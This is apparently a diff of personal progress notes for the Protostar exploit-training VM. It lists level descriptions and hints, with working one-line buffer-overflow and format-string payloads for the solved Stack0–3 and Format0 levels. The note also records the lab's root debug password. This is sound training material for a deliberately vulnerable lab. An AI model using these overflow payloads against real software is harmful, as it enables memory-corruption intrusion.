@@ -8,53 +8,228 @@ The levels to be exploited can be found in the /opt/protostar/bin directory.
 
 For debugging the final levels, you can log in as root with password “godmode” (without the quotes)
 
+for final levels Core files will be in /tmp
+
+got some binaries with no source...
+has 2 extra Net challenges for net3 and net4 ???
+
+
+Stack:  3/8
+Format: 1/5
+Heap:   0/4
+Net:    0/5
+Final:  0/3
+
 ----------------------------------------
 
-Stack0
+Stack0  (DONE)
+
+This level introduces the concept that memory can be accessed outside of its allocated region,
+how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
+
+solution:
 
 python -c "print 'a' * 100" /opt/protostar/bin/stack0
 
 ----------------------------------------
 
-Stack1
+Stack1  (DONE)
+
+This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
+
+Hints
+If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
+Protostar is little endian
+
+solution:
 
 /opt/protostar/bin/stack1 $(python -c "print 'a'*64 + 'd' + 'c' + 'b' + 'a'")
 
 ----------------------------------------
 
-Stack2
+Stack2  (DONE)
+
+Stack2 looks at environment variables, and how they can be set.
+
+solution:
 
 GREENIE=$(python -c "print 'a'*64 + '\x0a' + '\x0d' + '\x0a' + '\x0d'") /opt/protostar/bin/stack2
 
 ----------------------------------------
 
-Stack3
+Stack3  (DONE)
+
+Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
+
+Hints
+both gdb and objdump is your friend you determining where the win() function lies in memory.
 
 08048424
+
+solution:
 
 /opt/protostar/bin/stack3 <<< $(python -c "print 'a'*64 + '\x24' + '\x84' + '\x04' + '\x08'")
 
 ----------------------------------------
 
-----------------------------------------
+Stack4
+
+Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
+
+Hints
+A variety of introductory papers into buffer overflows may help.
+gdb lets you do “run < input”
+EIP is not directly after the end of buffer, compiler padding can also increase the size.
 
 ----------------------------------------
 
-----------------------------------------
+Stack5
+
+Stack5 is a standard buffer overflow, this time introducing shellcode.
+
+Hints
+At this point in time, it might be easier to use someone elses shellcode
+If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
+remove the int3s once your shellcode is done.
 
 ----------------------------------------
 
-----------------------------------------
+Stack6
+
+Stack6 looks at what happens when you have restrictions on the return address.
+
+This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.
+
+It is strongly suggested you experiment with multiple ways of getting your code to execute here.
 
 ----------------------------------------
 
-----------------------------------------
+Stack7
+
+Stack7 introduces return to .text to gain code execution.
+
+The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.
 
 ----------------------------------------
 
-----------------------------------------
+Format0  (DONE)
+
+This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.
+
+Hints
+This level should be done in less than 10 bytes of input.
+“Exploiting format string vulnerabilities”
+
+solution:
+
+/opt/protostar/bin/format0 "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde")"
 
 ----------------------------------------
 
+Format1
+
+This level shows how format strings can be used to modify arbitrary memory locations.
+
+Hints
+objdump -t is your friend, and your input string lies far up the stack :)
+
 ----------------------------------------
 
+Format2
+
+This level moves on from format1 and shows how specific values can be written in memory.
+
+----------------------------------------
+
+Format3
+
+This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process.
+This also teaches you to carefully control what data is being written to the process memory.
+
+----------------------------------------
+
+Format4
+
+format4 looks at one method of redirecting execution in a process.
+
+Hints:
+objdump -TR is your friend
+
+----------------------------------------
+
+Heap0
+
+This level introduces heap overflows and how they can influence code flow.
+
+----------------------------------------
+
+Heap1
+
+This level takes a look at code flow hijacking in data overwrite cases.
+
+----------------------------------------
+
+Heap2
+
+This level examines what can happen when heap pointers are stale.
+
+This level is completed when you see the “you have logged in already!” message
+
+----------------------------------------
+
+Heap3
+
+This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.
+
+----------------------------------------
+
+Net0
+
+This level takes a look at converting strings to little endian integers.
+
+----------------------------------------
+
+Net1
+
+This level tests the ability to convert binary integers into ascii representation.
+
+----------------------------------------
+
+Net2
+
+This code tests the ability to add up 4 unsigned 32-bit integers. Hint: Keep in mind that it wraps.
+
+----------------------------------------
+
+Net3
+
+???
+
+----------------------------------------
+
+Net4
+
+???
+
+----------------------------------------
+
+Final0
+
+This level combines a stack overflow and network programming for a remote overflow.
+
+Hints: depending on where you are returning to, you may wish to use a toupper() proof shellcode.
+
+----------------------------------------
+
+Final1
+
+This level is a remote blind format string level. The ‘already written’ bytes can be variable, and is based upon the length of the IP address and port number.
+
+When you are exploiting this and you don’t necessarily know your IP address and port number (proxy, NAT / DNAT, etc),
+you can determine that the string is properly aligned by seeing if it crashes or not when writing to an address you know is good.
+
+----------------------------------------
+
+Final2
+
+Remote heap level :)
